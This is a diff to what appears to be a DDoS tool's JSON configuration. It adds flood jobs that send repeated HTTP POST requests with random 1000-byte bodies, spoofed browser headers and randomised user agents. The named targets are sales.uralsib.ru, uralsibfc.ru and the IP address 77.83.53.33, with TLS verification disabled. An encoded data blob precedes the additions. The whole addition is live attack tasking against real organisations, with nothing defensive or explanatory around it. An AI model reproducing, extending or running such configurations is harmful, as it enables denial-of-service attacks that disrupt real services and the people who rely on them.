@@ -5,6 +5,176 @@
             "args": {
                 "data": "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"
             }
+        },
+        {
+            "type": "packetgen",
+            "count": 4,
+            "name": "https://sales.uralsib.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "sales.uralsib.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://sales.uralsib.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://sales.uralsib.ru",
+                                "Referer": "https://sales.uralsib.ru",
+                                "X-Forwarded-Host": "sales.uralsib.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 4,
+            "name": "https://sales.uralsib.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "sales.uralsib.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://sales.uralsib.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://sales.uralsib.ru",
+                                "Referer": "https://sales.uralsib.ru",
+                                "X-Forwarded-Host": "sales.uralsib.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 4,
+            "name": "http://uralsibfc.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "uralsibfc.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://uralsibfc.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://uralsibfc.ru",
+                                "Referer": "http://uralsibfc.ru",
+                                "X-Forwarded-Host": "uralsibfc.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 3,
+            "name": "http://77.83.53.33",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "77.83.53.33:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://77.83.53.33",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://77.83.53.33",
+                                "Referer": "http://77.83.53.33",
+                                "X-Forwarded-Host": "77.83.53.33",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
         }
     ]
 }
